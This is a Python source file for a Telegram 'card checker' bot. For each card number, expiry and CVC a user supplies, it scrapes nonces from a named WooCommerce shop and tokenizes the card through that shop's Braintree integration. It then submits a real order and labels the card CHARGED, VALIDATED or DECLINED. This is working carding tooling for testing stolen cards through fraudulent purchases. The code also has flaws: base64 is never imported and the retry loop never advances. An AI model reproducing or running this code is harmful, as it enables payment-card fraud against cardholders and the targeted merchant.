import requests
import time
import json

def process_nonsk2_command(bot, message):
    chat_id = message.chat.id
    cards = message.text.split()[1:]
    if cards:
        total_cards = len(cards)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK2 CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in cards:
            result = check_nonsk2(card)
            results.append(f"Card: {card}\nResponse => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk2 cc|mm|yy|cvc")

def check_nonsk2(card):
    try:
        retry = 0
        while retry < 3:
            # Replace these with your own proxy details or remove if not using proxies
            hostname = "your_proxy_hostname"
            port = "your_proxy_port"
            username = "your_proxy_username"
            password = "your_proxy_password"

            # Split the card details
            cc, mm, yy, cvv = card.split("|")

            # Make initial requests to gather necessary data
            Cookies = "cookies.txt"
            r = requests.session()
            response = r.get("https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/")
            if response.status_code != 200:
                return f"Failed to access product page. Status code: {response.status_code}"

            response = r.get("https://reinrespects.com/checkout/")
            if response.status_code != 200:
                return f"Failed to access checkout page. Status code: {response.status_code}. HTML content: {response.text}"

            checkout_nonce = extract_string(response.text, 'id="woocommerce-process-checkout-nonce" value="', '"')
            wcal_guest_capture_nonce = extract_string(response.text, 'id="wcal_guest_capture_nonce" value="', '"')
            client_token_nonce = extract_string(response.text, '"client_token_nonce":"', '"')

            if not checkout_nonce or not wcal_guest_capture_nonce or not client_token_nonce:
                return "Failed to retrieve necessary nonce values from the checkout page."

            # Request for client token
            data = {
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce
            }
            headers = {
                "Referer": "https://reinrespects.com/checkout/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            response = r.post("https://reinrespects.com/wp-admin/admin-ajax.php", data=data, headers=headers)
            if response.status_code != 200:
                return f"Failed to retrieve client token. Status code: {response.status_code}. HTML content: {response.text}"

            authorizationFingerprint = json.loads(base64.b64decode(extract_string(response.text, '{"success":true,"data":"', '"'))).get("authorizationFingerprint")
            if not authorizationFingerprint:
                return "Failed to retrieve authorization fingerprint."

            # Tokenize the credit card
            data = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": "example-session-id"
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvv
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {authorizationFingerprint}"
            }
            response = r.post("https://payments.braintree-api.com/graphql", json=data, headers=headers)
            if response.status_code != 200:
                return f"Failed to tokenize credit card. Status code: {response.status_code}. HTML content: {response.text}"

            token = json.loads(response.text).get("data", {}).get("tokenizeCreditCard", {}).get("token")
            if not token:
                return "Failed to retrieve token."

            # Complete the purchase
            data = {
                "billing_first_name": "John",
                "billing_last_name": "Doe",
                "billing_country": "US",
                "billing_address_1": "123 Main St",
                "billing_city": "Anytown",
                "billing_state": "CA",
                "billing_postcode": "12345",
                "billing_phone": "5555555555",
                "billing_email": "john.doe@example.com",
                "wcal_guest_capture_nonce": wcal_guest_capture_nonce,
                "payment_method": "braintree_credit_card",
                "wc_braintree_credit_card_card_type": "visa",
                "wc_braintree_credit_card_3d_secure_order_total": "8.95",
                "wc_braintree_credit_card_payment_nonce": token,
                "terms": "on",
                "terms-field": 1,
                "woocommerce-process-checkout-nonce": checkout_nonce
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            response = r.post("https://reinrespects.com/?wc-ajax=checkout", data=data, headers=headers)
            if response.status_code != 200:
                return f"Failed to complete the purchase. Status code: {response.status_code}. HTML content: {response.text}"

            response_data = json.loads(response.text)

            if "order-received" in response.text:
                receipturl = response_data.get("redirect", "").replace("\\", "")
                return f"CHARGED {card} <a href='{receipturl}' target='_blank'>Receipt</a>"

            elif "The card verification number does not match" in response.text:
                return f"VALIDATED {card} The card verification number does not match"

            elif "The provided address does not match" in response.text:
                return f"VALIDATED {card} The provided address does not match"

            elif response_data.get("messages"):
                return f"DECLINED {card} {response_data.get('messages')}"

            return f"DECLINED {card} {json.dumps(response_data)}"

    except Exception as e:
        return f"An error occurred: {str(e)}"

def extract_string(content, start, end):
    try:
        return content.split(start)[1].split(end)[0]
    except IndexError:
        return None

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Cards Checked - {total_cards}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
